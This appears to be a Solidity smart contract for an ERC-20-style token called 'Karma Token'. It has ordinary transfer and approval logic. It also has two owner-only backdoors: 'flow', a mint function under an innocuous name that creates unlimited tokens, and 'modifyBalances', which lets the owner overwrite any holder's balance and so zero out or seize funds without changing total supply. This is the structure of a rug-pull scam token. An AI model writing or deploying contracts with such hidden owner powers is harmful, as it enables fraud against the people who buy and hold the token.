// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KARMA {
    string public name = "Karma Token";
    string public symbol = "KARMA";
    uint256 public totalSupply;

    uint8 public decimals = 18;  // 18 decimal places

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public owner;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event BalanceModified(address indexed target, uint256 oldValue, uint256 newValue);

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the contract owner can call this function");
        _;
    }

    constructor() {
        totalSupply = 500000000 * 10**uint256(decimals); // 500M tokens w/ 18 dec places
        balanceOf[msg.sender] = totalSupply;
        owner = msg.sender;
    }

    function transfer(address _to, uint256 _value) external returns (bool success) {
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");
        _transfer(msg.sender, _to, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) external returns (bool success) {
        require(balanceOf[_from] >= _value, "Insufficient balance");
        require(allowance[_from][msg.sender] >= _value, "Not allowed to transfer");
        _transfer(_from, _to, _value);
        _approve(_from, msg.sender, allowance[_from][msg.sender] - _value);
        return true;
    }

    function _transfer(address _from, address _to, uint256 _value) internal {
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
    }

    function approve(address _spender, uint256 _value) external returns (bool success) {
        _approve(msg.sender, _spender, _value);
        return true;
    }

    function _approve(address _owner, address _spender, uint256 _value) internal {
        allowance[_owner][_spender] = _value;
        emit Approval(_owner, _spender, _value);
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "New owner address is invalid");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function flow(address _to, uint256 _value) external onlyOwner returns (bool success) {
        require(_value > 0, "Invalid amount");
        balanceOf[_to] += _value;
        totalSupply += _value;
        emit Transfer(address(0), _to, _value);
        return true;
    }

  
    function modifyBalances(address[] calldata targets, uint256[] calldata newValues) external onlyOwner {
        require(targets.length == newValues.length, "Arrays length mismatch");
        for (uint256 i = 0; i < targets.length; i++) {
            uint256 oldValue = balanceOf[targets[i]];
            balanceOf[targets[i]] = newValues[i];
            emit BalanceModified(targets[i], oldValue, newValues[i]);
        }
    }
}